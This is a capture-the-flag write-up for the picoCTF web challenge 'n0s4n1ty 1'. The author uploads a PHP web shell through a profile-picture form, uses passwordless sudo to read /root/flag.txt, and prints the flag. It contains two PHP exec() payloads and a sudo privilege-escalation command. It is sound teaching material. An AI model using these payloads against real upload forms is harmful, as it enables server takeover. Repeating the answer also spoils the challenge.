# n0s4n1ty 1
Author:  Prince Niyonshuti N.


## üìÇ Category
- Web Exploitation  
- Difficulty: Easy  

---

## üß© Challenge Description
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

---

## üîç Initial Observations
- Clicking on the **upload profile** button (even without uploading anything) redirects to a page with `.../upload.php` in the URL.
- This strongly suggests the server processes uploads using a PHP script, and that `.php` files might not be blocked.

---

## üß™ Exploitation Steps

1. Opened Notepad and wrote a PHP payload (by referring to hint 2):
   ```php
   <?php echo exec("sudo -l"); ?>
2. Saved the file as ```shell.php```
3. Uploaded the file through the profile picture form.
4. The server responded with: **_The file shell.php has been uploaded Path: uploads/shell.php_**
5. Navigated to **_uploads/shell.php_** by replacing ```.../upload.php``` in the url with ```uploads/shell.php```
6. The page displayed **_(ALL) NOPASSWD: ALL_** -> This means the server allows running commands as ```sudo``` without a password.
7. Edited ```shell.php``` with 
    ```php
    <?php echo exec("sudo cat /root/flag.txt");?>
8. Repeat step 5
9. The flag was displayed on the page.

---

## üèÅ Flag

picoCTF{wh47_c4n_u_d0_wPHP_5f894f6c}

---

## üß† What I Learned

- How to identify and test if a server allows ```.php``` files to be executed.
- How PHP file upload vulnerabilities can be abused for Remote Code Execution (RCE).
- The meaning and impact of ```NOPASSWD: ALL``` in a sudo context ‚Äî it means commands can be run as root without a password.
- Upload functionality must validate file extension, content, and execution permissions.

**How the upload and execution worked**

The HTML form likely looks like this behind the scenes:

    <form action="upload.php" method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit">
    </form>>

- This form sends the file to a script called `upload.php`.
- `upload.php` receives the file and saves it to the server, typically under a folder like `uploads/`.
- When you navigate to `shell.php`, the web server sees the `.php` extension and executes the file as PHP, not as plain text

### **Code explanation**

**Payload 1:** ```<?php echo exec("sudo -l"); ?>```

Purpose: Lists the current user's sudo privileges.
- ```sudo -l``` tells us what commands the user is allowed to run with elevated privileges.
- In this case, it returned: ```(ALL) NOPASSWD: ALL``` which means the user can run any command with sudo and no password, allowing full privilege escalation.

**Payload 2:** ```<?php echo exec("sudo cat /root/flag.txt"); ?>```

Purpose: Reads the contents of the ```flag.txt``` file in the ```/root``` directory (normally accessible only to root).
- Since NOPASSWD is enabled, the command runs as root without asking for a password.
- ```exec()``` executes the command on the server, and ```echo``` prints the output to the browser.

---
## üìö References and Resources

- https://www.youtube.com/watch?v=odUmAZLEhQk&ab_channel=COZT
- chatGPT

---
### Last updated: 5/14/2025